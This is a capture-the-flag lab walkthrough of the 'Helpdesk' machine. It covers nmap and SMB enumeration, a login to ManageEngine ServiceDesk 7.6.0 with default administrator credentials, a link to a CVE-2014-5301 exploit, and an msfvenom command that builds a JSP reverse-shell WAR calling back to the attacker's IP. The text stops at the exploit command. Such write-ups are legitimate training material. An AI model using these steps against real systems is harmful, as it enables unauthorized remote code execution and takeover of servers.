<h2>Recon</h2>

<h3>PortScanninig</h3>

>command:sudo nmap -A 192.168.118.43 -p- -T4 -v

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 08:52 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:52
Completed NSE at 08:52, 0.00s elapsed
Initiating NSE at 08:52
Completed NSE at 08:52, 0.00s elapsed
Initiating NSE at 08:52
Completed NSE at 08:52, 0.00s elapsed
Initiating Ping Scan at 08:52
Scanning 192.168.118.43 [4 ports]
Completed Ping Scan at 08:52, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:52
Completed Parallel DNS resolution of 1 host. at 08:52, 0.03s elapsed
Initiating SYN Stealth Scan at 08:52
Scanning 192.168.118.43 [65535 ports]
Discovered open port 139/tcp on 192.168.118.43
Discovered open port 445/tcp on 192.168.118.43
Discovered open port 8080/tcp on 192.168.118.43
Discovered open port 135/tcp on 192.168.118.43
Discovered open port 3389/tcp on 192.168.118.43
SYN Stealth Scan Timing: About 8.23% done; ETC: 08:58 (0:05:46 remaining)
SYN Stealth Scan Timing: About 26.58% done; ETC: 08:56 (0:02:49 remaining)
SYN Stealth Scan Timing: About 40.52% done; ETC: 08:56 (0:02:14 remaining)
SYN Stealth Scan Timing: About 54.19% done; ETC: 08:56 (0:01:42 remaining)
SYN Stealth Scan Timing: About 72.45% done; ETC: 08:55 (0:00:57 remaining)
Completed SYN Stealth Scan at 08:55, 205.52s elapsed (65535 total ports)
Initiating Service scan at 08:55
Scanning 5 services on 192.168.118.43
Completed Service scan at 08:56, 11.98s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 192.168.118.43
Retrying OS detection (try #2) against 192.168.118.43
Initiating Traceroute at 08:56
Completed Traceroute at 08:56, 0.24s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 08:56
Completed Parallel DNS resolution of 2 hosts. at 08:56, 0.04s elapsed
NSE: Script scanning 192.168.118.43.
Initiating NSE at 08:56
Completed NSE at 08:56, 40.15s elapsed
Initiating NSE at 08:56
Completed NSE at 08:56, 1.54s elapsed
Initiating NSE at 08:56
Completed NSE at 08:56, 0.00s elapsed
Nmap scan report for 192.168.118.43
Host is up (0.20s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Apache-Coyote/1.1
|_http-title: ManageEngine ServiceDesk Plus
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.004 days (since Thu Mar  2 08:51:17 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-01T23:56:15-08:00
| nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 005056ba25d3 (VMware)
| Names:
|   HELPDESK<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  HELPDESK<20>         Flags: <unique><active>
| smb2-security-mode: 
|   202: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-02T07:56:15
|_  start_date: 2023-03-02T07:51:24
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   230.27 ms 192.168.49.1
2   230.17 ms 192.168.118.43

NSE: Script Post-scanning.
Initiating NSE at 08:56
Completed NSE at 08:56, 0.00s elapsed
Initiating NSE at 08:56
Completed NSE at 08:56, 0.00s elapsed
Initiating NSE at 08:56
Completed NSE at 08:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.10 seconds
           Raw packets sent: 131300 (5.781MB) | Rcvd: 183 (8.792KB)

```
From our scna we can see 5 open ports. Our enumeration today will be focused on the netbios (port 139 & port 445) and http (port 8080) services



<h2>Enumeration Port 139&445</h2>

Lets check the available shares available on this smb server

>command:smbclient -L 192.168.118.43

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ smbclient -L 192.168.118.43                                                                    
Password for [WORKGROUP\bl4ck4non]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.118.43 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
oops, we couldn't fetch any available share on the server. 

Well, lets try nmap scripting engine to check if the version of the smb server has a vulnerability

>command:nmap -p 139,445 --script smb-vuln*.nse 192.168.118.43 -Pn

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/helpdesk]
└─$ nmap -p 139,445 --script smb-vuln*.nse 192.168.118.43 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-02 09:20 WAT
Nmap scan report for 192.168.118.43
Host is up (0.27s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

Nmap done: 1 IP address (1 host up) scanned in 61.06 seconds

```
>smb-vuln-cve2009-3103 detects Microsoft Windows systems vulnerable to denial of service (CVE-2009-3103). This script will crash the service if it is vulnerable

since this vulnerability won't be useful to us in a ctf like environment lets move on to the next port.



<h2>Enumeration Port 8080</h2>

Going to the webpage should get you something like this

![image](https://user-images.githubusercontent.com/67879936/222375436-20922f40-b09a-4d8e-b014-dbc074fabcd0.png)

This webpage is running the ManageEngine ServiceDesk service, so I went online to look for default creds that will enable us to log in. I actually found one hehe

```username:administrator```            ```password:administrator```

![image](https://user-images.githubusercontent.com/67879936/222376441-9f61ca6c-06c7-44af-84d5-78f2c81ab831.png)

![image](https://user-images.githubusercontent.com/67879936/222376522-7c3dd334-1e7c-4bf5-8515-7fdc369e0e99.png)

cool, now that we are logged in lets take a look around the webpage

While snooping around I found something

![image](https://user-images.githubusercontent.com/67879936/222378640-7eeaf1cd-e8d4-4865-91f3-98c70136e3a7.png)

I found the version at which the service is running on ```ManageEngine ServiceDesk 7.6.0```. Lets try to look for an exploit online

![image](https://user-images.githubusercontent.com/67879936/222379086-a6eae811-fc20-4fd0-9250-3d642357241a.png)

cool, we found an exploit. Now lets go ahead and exploit this vulnerability



<h2>Exploitation</h2>

>Link to exploit:https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

Downnload this exploit to your machine, then we try to run it

>command:python exploit.py

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/helpdesk]
└─$ ls
exploit.py  helpdesk
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/helpdesk]
└─$ python exploit.py
Usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE

```
Alright, there are some requirements needed to make this exploit work. The only requirement we haven't satisfied will be the "WARFILE", lets go ahead and create one using msfvenom

>command:msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=4444 -f war > runme.war

LHOST should be your machine's IP address while the LPORT should be the port you would want netcat to listen on

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/helpdesk]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.118 LPORT=4444 -f war > runme.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes

```
Now that we've done that, lets try to run the exploit again, this time with the requirements

>command:python exploit.py 192.168.118.43 8080 administrator administrator runme.war
























